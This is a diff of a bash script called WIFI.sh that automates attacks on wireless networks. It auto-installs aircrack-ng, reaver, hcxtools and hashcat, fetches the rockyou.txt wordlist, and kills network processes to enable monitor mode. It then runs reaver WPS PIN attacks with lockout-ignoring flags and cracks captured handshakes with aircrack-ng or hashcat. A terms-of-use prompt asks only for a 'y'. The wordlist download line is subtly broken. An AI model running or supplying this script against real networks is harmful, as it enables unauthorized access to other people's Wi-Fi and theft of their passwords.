@@ -1,26 +1,29 @@
 #!/bin/bash
 
-# WIFI.sh by AHMED NOAMAN
+# Coded by Ahmed Noaman
 # email: an758592@gmail.com
 # github: https://github.com/an758592/WIFI
 
-# Terms of Use for WIFI.sh Script.
-echo "By using the WIFI.sh script you agree to the following terms and conditions:"
-echo "1- Usage: The Script is provided for educational and testing purposes only. It is intended to be used by individuals who have the necessary permissions to conduct security testing on wireless networks."
-echo "2- Responsibility: You are solely responsible for any actions taken using the Script. This includes but is not limited to scanning for wireless networks, capturing packets, and attempting to crack passwords. You must ensure that your actions comply with all applicable laws and regulations."
-echo "3- No Warranty: The Script is provided as is, without any warranty of any kind, express or implied. We do not guarantee the accuracy, reliability, or suitability of the Script for any purpose."
-echo "4- No Liability: In no event shall the authors of the Script be liable for any direct, indirect, incidental, special, exemplary, or consequential damages (including, but not limited to, procurement of substitute goods or services; loss of use, data, or profits; or business interruption) arising in any way out of the use of the Script, even if advised of the possibility of such damage."
-echo "5- Ethical Use: You agree to use the Script ethically and responsibly. This includes obtaining proper authorization before testing networks that you do not own or have explicit permission to test."
-echo "6- Compliance: You agree to comply with all applicable laws, regulations, and ethical guidelines when using the Script. This includes but is not limited to laws related to network security, privacy, and data protection."
-echo "7- Indemnification: You agree to indemnify and hold harmless the authors of the Script from any claims, damages, or liabilities arising out of your use of the Script, including but not limited to any claims relating to unauthorized access to networks or data."
-echo "8- Modification: You may modify the Script for your own personal use. However, you may not distribute or publish modified versions of the Script without the explicit permission of the authors."
-echo "9- Termination: I reserve the right to terminate or suspend your access to the Script at any time, without prior notice or liability, for any reason whatsoever."
-echo "10- Acceptance: By using the Script, you acknowledge that you have read, understood, and agree to be bound by these terms and conditions."
+echo "██  ██  ██  ██████  ██████████"
+echo "██  ██  ██    ██    ██      ██"
+echo "██  ██  ██    ██    ████    ██"
+echo "██  ██  ██    ██    ██      ██"
+echo "██████████  ██████  ██    ████"
 
-# Requiring the user to agree to the terms of use.
+echo "By using the WIFI.sh script you agree to the following terms and conditions:"
+echo "1-Usage: The script is for educational and testing purposes only, and users must have the necessary permissions for security testing on wireless networks."
+echo "2-Responsibility: Users are solely responsible for their actions using the script, including compliance with laws and regulations."
+echo "3-No Warranty: The script is provided as is, without any warranties."
+echo "4-No Liability: The author of the script are not liable for damages arising from its use."
+echo "5-Ethical Use: Users agree to use the script ethically and responsibly, obtaining proper authorization before testing networks."
+echo "6-Compliance: Users agree to comply with all applicable laws, regulations, and ethical guidelines."
+echo "7-Indemnification: Users agree to indemnify the author from any claims arising from their use of the script."
+echo "8-Modification: Users may modify the script for personal use but may not distribute modified versions without permission."
+echo "9-Termination: The author reserve the right to terminate or suspend access to the script without notice."
+echo "10-Acceptance: By using the script, users acknowledge and agree to these terms and conditions."
+
 read -p "Do you agree with these terms? [y=YES-continue/n=NO-exit] : " terms
 
-# Check if the user agrees to the terms of use.
 if [ "$terms" != y ]; then
     echo "You are not authorized to use the Script."
     exit
@@ -28,43 +31,66 @@ fi
 
 clear
 
-# Check if the script is being run with sudo.
 if [ "$(id -u)" != 0 ]; then
-    echo "Run the script as ROOT or use SUDO"
+    echo "Run the script as root or use sudo, and try again."
     exit
 fi
 
-# Check if necessary tools are installed.
-required_tools=("aircrack-ng" "airodump-ng" "airmon-ng" "reaver" "ifconfig")
+if [ -f /etc/os-release ]; then
+    source /etc/os-release
+    distribution="$ID"
+elif [ -f /etc/lsb-release ]; then
+    source /etc/lsb-release
+    distribution="$DISTRIB_ID"
+fi
+
+required_tools=("aircrack-ng" "reaver" "ifconfig" "wget" "hcxtools" "hashcat")
+
 for tool in "${required_tools[@]}"; do
     if ! command -v "$tool"; then
-        echo "Required tool '$tool' not found. install it and try again."
-        exit
+        if [ "$distribution" = Ubuntu ] || [ "$distribution" = kali ] || [ "$distribution" = debian ]; then
+            apt-get update -y
+            apt-get install "$tool" -y
+        elif [ "$distribution" = fedora ]; then
+            dnf update -y
+            dnf install "$tool" -y
+        else
+            echo "Install '$tool', and try again."
+            exit
+        fi
     fi
 done
 
 clear
+
 ifconfig
 
-# Prompt the user to enter the wireless interface to be used.
 read -p "Enter the interface [default=wlan0] : " interface
 interface=${interface:-wlan0}
 
-# Prompt the user to enter the path to save captured data.
-read -p "Enter the path to the capfile : " cap
+read -p "Enter the path and name to save the capfile [default=/root/] : " cap
+cap=${cap:-/root/}
 
-# Prompt the user to enter the path to the wordlist file for password cracking.
-read -p "Enter the path to the wordlist : " wordlist
+read -p "Did you want to dawnload rockyou.txt dictionary file? [1=dawnload-it/2=already-have-it/3=use-another-wordlist] : " rockyou
 
-# Start monitor mode.
+if [ "$rockyou" = 1 ]; then
+    mkdir /usr/share/wordlists/
+    wget -O /usr/share/wordlists/ https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+    wordlist="/usr/share/wordlists/rockyou.txt"
+elif [ "$rockyou" = 2 ]; then
+    wordlist="/usr/share/wordlists/rockyou.txt"
+elif [ "$rockyou" = 3 ]; then
+    read -p "Enter the path to the wordlist : " wordlist
+    wordlist=${wordlist:-/usr/share/wordlists/rockyou.txt}
+fi
+
 airmon-ng check kill
 airmon-ng start "$interface"
+
 clear
 
-# Prompt the user to select mode.
 read -p "Enter the mode number [1=scan-ONE/2=scan-ALL/3=WPS-attack] : " mode
 
-# Depending on the mode selected, perform specific actions.
 if [ "$mode" = 1 ]; then
     airodump-ng --wps "$interface"mon
     read -p "Enter the AP MAC [TARGET] : " amac
@@ -76,7 +102,7 @@ elif [ "$mode" = 3 ]; then
     airodump-ng --wps "$interface"mon
     read -p "Enter the AP MAC [TARGET] : " amac
     read -p "Enter the channel number [1:13] : " channel
-    reaver -i "$interface"mon -c "$channel" -b "$amac" -vv
+    reaver -L -N -i "$interface"mon -c "$channel" -b "$amac" -vv
 else
     airmon-ng stop "$interface"mon
     service NetworkManager restart
@@ -85,14 +111,17 @@ fi
 
 clear
 
-# Prompt the user if they want to start password cracking.
-read -p "Do you want to start password cracking now? [y=YES-continue/n=NO-exit] : " continue
+read -p "Start password cracking with [1=aircrack-ng/2=hashcat] : " crack
 
-# If the user chooses to start password cracking.
-if [ "$continue" = y ]; then
+if [ "$crack" = 1 ]; then
     airmon-ng stop "$interface"mon
     service NetworkManager restart
     aircrack-ng -w "$wordlist" "$cap"-01.cap
+elif [ "$crack" = 2 ]; then
+    airmon-ng stop "$interface"mon
+    service NetworkManager restart
+    hcxpcapngtool -o "$cap".22000 "$cap"-01.cap
+    hashcat -m 22000 "$cap".22000 "$wordlist"
 else
     airmon-ng stop "$interface"mon
     service NetworkManager restart
